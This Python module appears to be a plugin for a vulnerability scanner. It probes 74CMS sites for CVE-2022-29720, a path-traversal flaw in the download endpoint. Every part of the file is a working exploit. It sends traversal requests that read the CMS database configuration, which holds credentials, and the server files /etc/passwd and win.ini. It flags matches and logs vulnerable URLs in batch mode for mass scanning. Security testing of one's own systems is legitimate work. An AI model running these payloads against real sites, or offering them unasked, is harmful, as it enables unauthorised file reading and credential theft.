import requests,re,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class Cve_2022_29720:
	def scan(self,baseurl):
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"index.php/index/download/index?name=passwd&url=../../application/database.php"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if response.status_code == 200 and re.search("^(<\\?(\\s)*(php)?)",response.text) and re.search("\\'*\\'(\\s)*=>(\\s)*\\n",response.text):
			OutPrintInfoSuc("74CMS", f"存在CVE-2022-29720: {url}")
			if self.batch:
				OutPutFile("74cms_2022_29720.txt", f"存在CVE-2022-29720漏洞: {url}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在CVE-2022-29720")
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"index.php/index/download/index?name=passwd&url=../../../../../../../etc/passwd"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if response.status_code == 200 and re.search("root:[x*]:0:0",response.text):
			OutPrintInfoSuc("74CMS", f"存在CVE-2022-29720: {url}")
			if self.batch:
				OutPutFile("74cms_2022_29720.txt", f"存在CVE-2022-29720漏洞: {url}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在CVE-2022-29720")
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+"index.php/index/download/index?name=win.ini&url=../../../../../../../windows/win.ini"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if response.status_code == 200 and "for 16-bit app support" in response.text:
			OutPrintInfoSuc("74CMS", f"存在CVE-2022-29720: {url}")
			if self.batch:
				OutPutFile("74cms_2022_29720.txt", f"存在CVE-2022-29720漏洞: {url}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在CVE-2022-29720")

	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("74CMS", "开始检测CVE-2022-29720...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "CVE-2022-29720检测结束")
